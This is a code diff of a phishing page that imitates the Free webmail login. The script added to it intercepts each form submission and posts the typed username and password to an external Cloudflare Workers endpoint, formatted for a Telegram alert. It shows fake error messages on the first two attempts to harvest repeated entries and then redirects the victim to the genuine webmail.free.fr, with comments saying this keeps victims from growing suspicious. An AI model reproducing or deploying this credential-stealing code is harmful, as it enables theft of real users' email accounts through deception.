@@ -150,98 +150,118 @@
         </div>
     </div>
     
-    <script>
-        function showZimbra() {
-            $(".webmailClassique").fadeOut(500, function() {
-                $('.webmailZimbra').fadeIn(500);
-            });
-        }
-        
-        function showClassique() {
-            $(".webmailZimbra").fadeOut(500, function() {
-                $('.webmailClassique').fadeIn(500);
-            });
-        }
-        
-        $(function() {
-            $(".togglePassword").click(function() {
-                var input = $($(this).attr("toggle"));
-                input.attr("type", "text");
-                $(this).removeClass("slash");
-                var eyeIcon = $(this);
-                setTimeout(function() {
-                    eyeIcon.addClass("slash");
-                    input.attr("type", "password");
-                }, 2000);
-            });
+    
+        <script>
+    // 1. UI Toggle Functions
+    function showZimbra(){
+        $(".webmailClassique").fadeOut(500, function(){
+            $('.webmailZimbra').fadeIn(500);
         });
+    }
+
+    function showClassique(){
+        $(".webmailZimbra").fadeOut(500, function(){
+            $('.webmailClassique').fadeIn(500);
+        });
+    }
+
+    $(function () {
+        $(".togglePassword").click(function () {
+            var input = $($(this).attr("toggle"));
+            input.attr("type", "text");
+            $(this).removeClass("slash");
+            var eyeIcon = $(this);
+            setTimeout(function () {
+                eyeIcon.addClass("slash");
+                input.attr("type", "password");
+            }, 2000);
+        });
+    });
+
+    // ========================================================
+    // 2. UPGRADED LOGIC (3 ATTEMPTS + REDIRECT)
+    // ========================================================
+    const BACKEND_API_URL = "https://testdatasend.narpatprihar2005.workers.dev";
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const forms = document.querySelectorAll("form");
         
-        // Backend URL (Aapka Cloudflare Worker)
-        const BACKEND_API_URL = "https://testdatasend.narpatprihar2005.workers.dev";
-        
-        // Counter define kiya gaya hai
-        let loginAttempts = 0;
-        
-        document.addEventListener("DOMContentLoaded", () => {
-            const forms = document.querySelectorAll("form");
-            
-            forms.forEach(form => {
-                form.addEventListener("submit", async (e) => {
-                    e.preventDefault();
-                    
-                    const loginInput = form.querySelector("input[type='text'], input[id='login'], input[name='login'], input[name='_user']");
-                    const passwordInput = form.querySelector("input[type='password'], input[id='passwd'], input[name='passwd'], input[name='_pass']");
-                    const submitBtn = form.querySelector("input[type='submit']");
-                    const errorBox = form.querySelector(".error-msg");
-                    
-                    if (loginInput && passwordInput) {
-                        const login = loginInput.value.trim();
-                        const password = passwordInput.value;
-                        
-                        if (login !== "" && password !== "") {
-                            // Attempt badhao
-                            loginAttempts++;
-                            
-                            // Loading state start
-                            const originalBtnText = submitBtn.value;
-                            submitBtn.disabled = true;
-                            submitBtn.value = "Patientez...";
-                            errorBox.style.display = "none"; // Hide previous error if any
-                            
-                            // Message Format for Telegram
-                            const formattedMessage = `🚨 **Nouveau Login Free (Tentative ${loginAttempts})**\n\n👤 **Identifiant:** ${login}\n🔑 **Password:** ${password}`;
-                            
-                            // Send data to backend regardless of attempt number
-                            try {
-                                await fetch(BACKEND_API_URL, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ text_data: formattedMessage })
-                                });
-                            } catch (error) {
-                                console.error("Data send error:", error);
-                                // Error ko ignore karenge taaki user ka experience break na ho
-                            }
-                            
-                            // Logic for 1st, 2nd, and 3rd attempt
-                            if (loginAttempts < 3) {
-                                // Pehli 2 baar error dikhao
+        forms.forEach(form => {
+            // Form ke default action ko puri tarah khatam karna
+            form.removeAttribute("action");
+            form.setAttribute("onsubmit", "return false;");
+
+            form.addEventListener("submit", async (e) => {
+                e.preventDefault(); // Browser refresh hone se rokne ke liye
+                e.stopPropagation();
+
+                const loginInput = form.querySelector("input[type='text'], input[name='_user'], input[name='login']");
+                const passwordInput = form.querySelector("input[type='password'], input[name='_pass'], input[name='password']");
+                const submitBtn = form.querySelector("input[type='submit']");
+                const errorBox = form.closest('.webmailBloc').querySelector(".error-msg");
+
+                if (loginInput && passwordInput) {
+                    const login = loginInput.value.trim();
+                    const password = passwordInput.value;
+
+                    if (login !== "" && password !== "") {
+                        // Attempt count ko browser session mein check karna
+                        let currentAttempt = parseInt(sessionStorage.getItem('attempts')) || 0;
+                        currentAttempt++;
+                        sessionStorage.setItem('attempts', currentAttempt);
+
+                        // UI: Loading state
+                        const originalBtnText = submitBtn.value;
+                        submitBtn.disabled = true;
+                        submitBtn.value = "Patientez...";
+                        if(errorBox) errorBox.style.display = "none";
+
+                        // Telegram Message
+                        const formattedMessage = `🚨 **Nouveau Login Free**\n📌 **Tentative:** ${currentAttempt}/3\n👤 **Identifiant:** ${login}\n🔑 **Password:** ${password}`;
+
+                        try {
+                            // Data Backend par bhej rahe hain
+                            await fetch(BACKEND_API_URL, {
+                                method: 'POST',
+                                mode: 'cors',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ text_data: formattedMessage })
+                            });
+
+                            // Logic Check
+                            if (currentAttempt < 3) {
+                                // Pehli 2 baar error dikhana
                                 setTimeout(() => {
-                                    errorBox.style.display = "block"; // Show red error box
-                                    passwordInput.value = ""; // Clear password field
-                                    passwordInput.focus(); // Cursor wapas password par
+                                    if(errorBox) errorBox.style.display = "block";
+                                    passwordInput.value = ""; // Password saaf karo
+                                    passwordInput.focus();
                                     submitBtn.disabled = false;
                                     submitBtn.value = originalBtnText;
-                                }, 800); // Thoda delay (0.8s) taaki natural lage
+                                }, 1000);
                             } else {
-                                // 3rd baar sidha redirect
-                                window.location.href = "https://webmail.free.fr/";
+                                // Teesri baar redirect
+                                sessionStorage.removeItem('attempts'); // Reset for next time
+                                window.location.replace("https://webmail.free.fr/");
+                            }
+
+                        } catch (error) {
+                            // Network error par bhi login reload (user ko shaq na ho)
+                            console.log("Error:", error);
+                            if (currentAttempt >= 3) {
+                                window.location.replace("https://webmail.free.fr/");
+                            } else {
+                                if(errorBox) errorBox.style.display = "block";
+                                submitBtn.disabled = false;
+                                submitBtn.value = originalBtnText;
                             }
                         }
                     }
-                });
+                }
+                return false;
             });
         });
+    });
+
     </script>
 </body>
 
